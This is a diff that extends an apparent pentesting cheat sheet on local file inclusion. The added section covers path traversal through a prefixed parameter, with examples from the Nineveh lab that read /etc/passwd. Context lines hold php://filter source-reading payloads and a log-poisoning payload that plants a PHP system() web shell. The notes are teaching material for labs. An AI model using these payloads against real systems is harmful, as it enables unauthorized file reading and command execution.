@@ -70,6 +70,14 @@ http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../.
 http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/wordpress/index.php
 ```
 
+**When the parameter is prefixed (e.g. `notes=files/...`):** try traversing from the known path. Working patterns:
+
+```
+# Known valid: ?notes=files/ninevehNotes.txt
+files/ninevehNotes/../../../../../../../etc/passwd
+/ninevehNotes/../etc/passwd
+```
+
 ---
 
 ## LFI Bypass Techniques
@@ -224,6 +232,30 @@ ssh <?php system($_GET["cmd"]);?>@10.10.10.10
 ```
 http://example.com/index.php?page=/var/log/auth.log&cmd=id
 ```
+
+### LFI when the parameter has a prefix (e.g. `notes=files/...`)
+
+When the vulnerable parameter is used with a fixed prefix (e.g. `?notes=files/ninevehNotes.txt`), you need to traverse from that path. Probe by changing the value and watching responses:
+
+* **Valid file** – page shows content (no error).
+* **Missing file** – PHP warning like `failed to open stream: No such file or directory` (confirms `include()` and path handling).
+* **Filtered / no include** – generic message like “No Note is selected.”
+
+**What often does not work:** bare path (`/etc/passwd`), too many `../` (e.g. “File name too long”), or dropping the prefix entirely (“No Note is selected”).
+
+**What often works:** keep a prefix that still looks like a path under the allowed dir, then traverse up:
+
+```text
+# Known valid: ?notes=files/ninevehNotes.txt
+# Chop extension to see error and confirm include():
+?notes=files/ninevehNotes   → Warning: include(files/ninevehNotes): failed to open stream...
+
+# Traverse from the valid path (adjust depth as needed):
+?notes=files/ninevehNotes/../../../../../../../etc/passwd   → /etc/passwd
+?notes=/ninevehNotes/../etc/passwd                        → /etc/passwd
+```
+
+Start with fewer `../` and add more until you hit the root; too many can trigger “File name too long”. Use `view-source:` or curl to confirm you’re reading the real file content.
 
 ### RCE via Apache logs
 
